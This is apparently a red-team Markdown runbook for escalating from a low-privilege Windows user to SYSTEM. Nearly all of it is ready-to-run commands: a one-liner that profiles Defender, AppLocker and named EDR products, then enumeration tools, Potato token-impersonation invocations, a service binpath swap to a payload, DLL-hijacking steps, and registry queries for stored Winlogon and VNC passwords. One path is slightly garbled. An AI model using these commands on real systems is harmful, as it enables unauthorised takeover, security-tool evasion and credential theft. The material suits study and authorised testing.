---
tags: [windows, privesc, enumeration, uac, post-exploitation]
target_arch: x64
os: windows
---

# 🛡️ Windows Privilege Escalation (400/500 Level)

> [!ABSTRACT]
> This runbook is the definitive guide for escalating from a low-privilege user to `SYSTEM` or `Administrator`.
> **Goal**: Identify misconfigurations, unpatched vulnerabilities, and sensitive artifacts to elevate access.

---

## 🔍 Phase 1: Rapid Host Triage (The "Context" Script)

> [!TIP] Run this first to identify your constraints (EDR, AppLocker, CLM).

```powershell
# Rapid Triage One-Liner
$u=(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA;
$d=(Get-MpPreference).DisableRealtimeMonitoring;
$c=$ExecutionContext.SessionState.LanguageMode;
$a=if((Get-AppLockerPolicy -Effective -EA SilentlyContinue).RuleCollections.Count -gt 0){'On'}else{'Off'};
$l=(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -EA SilentlyContinue).RunAsPPL;
$e=(Get-Process -EA SilentlyContinue|?{$_.Name -match 'carbon|crowd|sentinel|cylance|cortex|tanium'}).Name-join',';
$s=if(Get-Service Sysmon* -EA SilentlyContinue){'Yes'}else{'No'};
echo "UAC:$u | Defender:$(if($d){'OFF'}else{'ON'}) | CLM:$c | AppLocker:$a | LSASS:$l | EDR:$e | Sysmon:$s"
```

---

## 🛠️ Phase 2: Enumeration (Automated & Manual)

### 1. Automated Checkers
| Tool | Purpose | Command |
| :--- | :--- | :--- |
| **WinPEAS** | Broad enumeration | `winpeas.exe > out.txt` |
| **Seatbelt** | High-signal artifacts | `Seatbelt.exe -group=all` |
| **SharpUp** | Misconfigurations | `SharpUp.exe audit` |
| **PowerUp** | Legacy misconfigs | `Invoke-AllChecks` |

### 2. Manual Quick Wins
```cmd
# Check User Privileges
whoami /priv

# Check for Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows" | findstr /i /v """

# Check for Writable Service Binaries
accesschk.exe -uwcqv "Users" *

# Check for AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## 🚀 Phase 3: Exploitation (PrivEsc Vectors)

### 1. Token Impersonation (Potato Attacks)
If you have `SeImpersonatePrivilege`:
- **PrintSpoofer**: Modern (Win10/Server 2016/2019). `PrintSpoofer.exe -i -c cmd`
- **JuicyPotato**: Legacy (Server 2012/2016). `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *`
- **GodPotato**: Modern fallback. `GodPotato.exe -cmd cmd.exe`

### 2. Service Misconfigurations
If you have `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`:
```cmd
sc config <SERVICE_NAME> binpath= "C:\path	o\payload.exe"
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```

### 3. DLL Hijacking
1. Identify a service loading a missing DLL (via ProcMon).
2. Place a malicious DLL with the same name in a writable directory in the search path.
3. Restart the service.

---

## 📂 Phase 4: Credential Hunting (Post-Exploitation)

### 1. Extracting Secrets
```powershell
# Hunt for passwords in Registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Dump LSASS (The "Mimikatz" Path)
# See [[06-credentials/RUNBOOK]] for modern dump methods.
```

### 2. DPAPI & Saved Sessions
Use **SessionGopher** to find PuTTY/WinSCP/RDP credentials.
```powershell
Invoke-SessionGopher -AllUserProfiles
```

---

## 🔗 Related Notes
- [[Active Directory]] - If you are local admin, hunt for domain users.
- [[03-loaders/RUNBOOK]] - For executing exploits in-memory.
- [[Admin Reference]] - For managing local users/groups.
- [[06-credentials/RUNBOOK]] - For LSASS dumping techniques.
